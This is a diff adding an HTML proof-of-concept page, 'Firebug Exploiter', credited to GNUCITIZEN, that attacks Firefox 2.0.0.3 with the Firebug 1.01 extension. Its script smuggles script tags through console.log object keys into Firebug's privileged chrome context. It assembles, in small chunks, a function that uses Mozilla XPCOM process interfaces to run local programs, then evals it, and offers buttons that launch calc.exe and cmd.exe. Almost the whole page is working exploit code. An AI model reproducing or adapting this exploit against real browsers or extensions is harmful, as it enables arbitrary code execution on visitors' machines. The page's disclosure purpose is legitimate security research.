@@ -1,0 +1,116 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+		<title>Firebug Exploiter</title>
+	</head>
+	<body id="presentation">
+
+		<div id="header">
+			<h1>Firebug Exploiter</h1>
+			<p>firebug exploitation tool</p>
+		</div>
+		
+		<div id="content">
+			<p>The following proof of concept works on Firefox 2.0.0.3 with Firebug 1.01. Other setups might be vulnerable too.</p>
+			<script>
+				// inject the payload in Firebug chrome context
+				console.log({'<script>var s=[]<\/script>': 'payload'});
+				console.log({'<script>s.push("function runFi")<\/script>': 'payload'});
+				console.log({'<script>s.push("le(f){var file")<\/script>': 'payload'});
+				console.log({'<script>s.push("=Components.cl")<\/script>': 'payload'});
+				console.log({'<script>s.push("asses[\\"@mozil")<\/script>': 'payload'});
+				console.log({'<script>s.push("la.org/file/lo")<\/script>': 'payload'});
+				console.log({'<script>s.push("cal;1\\"].creat")<\/script>': 'payload'});
+				console.log({'<script>s.push("eInstance(Comp")<\/script>': 'payload'});
+				console.log({'<script>s.push("onents.interfa")<\/script>': 'payload'});
+				console.log({'<script>s.push("ces.nsILocalFi")<\/script>': 'payload'});
+				console.log({'<script>s.push("le);file.initW")<\/script>': 'payload'});
+				console.log({'<script>s.push("ithPath(f);var")<\/script>': 'payload'});
+				console.log({'<script>s.push(" process=Compo")<\/script>': 'payload'});
+				console.log({'<script>s.push("nents.classes[")<\/script>': 'payload'});
+				console.log({'<script>s.push("\\"@mozilla.org")<\/script>': 'payload'});
+				console.log({'<script>s.push("/process/util;")<\/script>': 'payload'});
+				console.log({'<script>s.push("1\\"].createIns")<\/script>': 'payload'});
+				console.log({'<script>s.push("tance(Componen")<\/script>': 'payload'});
+				console.log({'<script>s.push("ts.interfaces.")<\/script>': 'payload'});
+				console.log({'<script>s.push("nsIProcess);pr")<\/script>': 'payload'});
+				console.log({'<script>s.push("ocess.init(fil")<\/script>': 'payload'});
+				console.log({'<script>s.push("e);var argv=Ar")<\/script>': 'payload'});
+				console.log({'<script>s.push("ray.prototype.")<\/script>': 'payload'});
+				console.log({'<script>s.push("slice.call(arg")<\/script>': 'payload'});
+				console.log({'<script>s.push("uments,1);proc")<\/script>': 'payload'});
+				console.log({'<script>s.push("ess.run(true,a")<\/script>': 'payload'});
+				console.log({'<script>s.push("rgv,argv.lengt")<\/script>': 'payload'});
+				console.log({'<script>s.push("h)}")<\/script>': 'payload'});
+
+				// evaluate the payload
+				console.log({'<script>eval(s.join(""))<\/script>': 'eval payload'});
+
+				// declare our process execution function
+				function execute (p) {
+					var p = p.replace(/\\/g, '\\\\');
+
+					console.log({'<script>var p=[]<\/script>': 'execute'});
+
+					for (var i = 0; i < p.length; i += 14) {
+						var mal_obj = {};
+						mal_obj['<script>p.push("' + p.substring(i, i + 14) + '")<\/script>'] = 'execute';
+
+						console.log(mal_obj);
+					}
+
+					console.log({'<script>runFile(p.join(""))<\/script>': 'execute'});
+				}
+			</script>
+			<table>
+				<thead>
+					<tr>
+						<td>Test</td>
+						<td>Description</td>
+					</tr>
+				</thead>
+				<tbody>
+					<tr>
+						<td><input type="button" value="execute calc.exe" onclick="execute('c:\\windows\\system32\\calc.exe')"/></td>
+						<td>the following test executes calc.exe</td>
+					</tr>
+					<tr>
+						<td><input type="button" value="execute cmd.exe" onclick="execute('c:\\windows\\system32\\cmd.exe')"/></td>
+						<td>the following test executes cmd.exe</td>
+					</tr>
+					<tr>
+						<td><input type="button" value="do something malicious" onclick="alert('done!!! you will never know')"/></td>
+						<td><strong>!!!</strong> don't click</td>
+					</tr>
+				</tbody>
+			</table>
+		</div>
+		
+		<div id="footer">
+			<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/">CC</a>)2006 <a href="http://www.gnucitizen.org">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">	
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/" />
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2006</dc:date>
+				<dc:creator><Agent><dc:title>Petko D. Petkov</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>Petko D. Petkov</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text" />
+				<dc:source rdf:resource="http://www.gnucitizen.org" />
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<script src="http://www.google-analytics.com/urchin.js" type="text/javascript"></script>
+		<script type="text/javascript">_uacct = "UA-363996-1"; urchinTracker();</script>
+	</body>
+</html>
